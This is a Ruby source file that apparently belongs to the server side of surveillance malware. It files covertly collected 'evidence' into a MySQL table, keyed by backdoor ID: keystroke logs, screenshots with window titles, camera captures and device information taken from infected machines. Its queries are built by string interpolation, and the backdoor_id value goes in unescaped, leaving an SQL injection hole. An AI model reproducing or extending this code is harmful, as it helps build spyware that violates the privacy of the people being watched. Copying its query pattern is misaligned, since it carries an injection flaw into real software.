#
# Mix-in for DB Layer
#

module DBLayer
module Evidence
  
  def evidence_store(evidence)
    trace :info, "storing evidence #{evidence.info[:type]}"
    
    cacheable = 1
    
    case evidence.info[:type]
      when :DEVICE, :INFO
        q = "INSERT INTO log (tag, type, flags, backdoor_id, remoteip, remotehost, remoteuser, received, acquired, longtext1)
                 VALUES (0,
                 '#{@mysql.escape(evidence.info[:type].to_s)}',
                 #{cacheable},
                 #{evidence.info[:backdoor_id]},
                 '#{@mysql.escape(evidence.info[:source_id])}',
                 '#{@mysql.escape(evidence.info[:device_id])}',
                 '#{@mysql.escape(evidence.info[:user_id])}',
                 '#{@mysql.escape(evidence.info[:received].to_s)}',
                 '#{@mysql.escape(evidence.info[:acquired].to_s)}',
                 '#{@mysql.escape(evidence.info[:content])}')"
      when :SNAPSHOT
        q = "INSERT INTO log (`tag`, `type`, `flags`, `backdoor_id`, `remoteip`, `remotehost`, `remoteuser`, `received`, `acquired`, `varchar1`, `varchar2`, `int1`, `longblob1`)
                 VALUES (0,
                 '#{@mysql.escape(evidence.info[:type].to_s)}',
                 #{cacheable},
                 #{evidence.info[:backdoor_id]},
                 '#{@mysql.escape(evidence.info[:source_id])}',
                 '#{@mysql.escape(evidence.info[:device_id])}',
                 '#{@mysql.escape(evidence.info[:user_id])}',
                 '#{@mysql.escape(evidence.info[:received].to_s)}',
                 '#{@mysql.escape(evidence.info[:acquired].to_s)}',
                 '#{@mysql.escape(evidence.info[:process_name])}',
                 '#{@mysql.escape(evidence.info[:window_name])}',
                 #{evidence.info[:content].size},
                 '#{@mysql.escape(evidence.info[:content])}')"
      when :KEYLOG
        q = "INSERT INTO log (tag, type, flags, backdoor_id, remoteip, remotehost, remoteuser, received, acquired, varchar1, varchar2, longtext1)
                 VALUES (0,
                 '#{@mysql.escape(evidence.info[:type].to_s)}',
                 #{cacheable},
                 #{evidence.info[:backdoor_id]},
                 '#{@mysql.escape(evidence.info[:source_id])}',
                 '#{@mysql.escape(evidence.info[:device_id])}',
                 '#{@mysql.escape(evidence.info[:user_id])}',
                 '#{@mysql.escape(evidence.info[:received].to_s)}',
                 '#{@mysql.escape(evidence.info[:acquired].to_s)}',
                 '#{@mysql.escape(evidence.info[:process_name])}',
                 '#{@mysql.escape(evidence.info[:window_name])}',
                 '#{@mysql.escape(evidence.info[:keystrokes])}')"
      when :CAMERA
        q = "INSERT INTO log (`tag`, `type`, `flags`, `backdoor_id`, `remoteip`, `remotehost`, `remoteuser`, `received`, `acquired`, `int1`, `longblob1`)
                 VALUES (0,
                 '#{@mysql.escape(evidence.info[:type].to_s)}',
                 #{cacheable},
                 #{evidence.info[:backdoor_id]},
                 '#{@mysql.escape(evidence.info[:source_id])}',
                 '#{@mysql.escape(evidence.info[:device_id])}',
                 '#{@mysql.escape(evidence.info[:user_id])}',
                 '#{@mysql.escape(evidence.info[:received].to_s)}',
                 '#{@mysql.escape(evidence.info[:acquired].to_s)}',
                 #{evidence.info[:content].size},
                 '#{@mysql.escape(evidence.info[:content])}')"
      else
        trace :debug, "Not implemented."
        return nil
    end
    
    ret =  mysql_query(q)
    
    stat = evidence.info[:type].to_s.downcase
    stat_new = stat + '_new'
    mysql_query("UPDATE `stat` SET `#{stat}` = `#{stat}` + 1, `#{stat_new}` = `#{stat_new}` + 1 WHERE `backdoor_id` = '#{evidence.info[:backdoor_id]}'")
    return ret
  end
  
end # ::Evidence
end # ::DBLayer
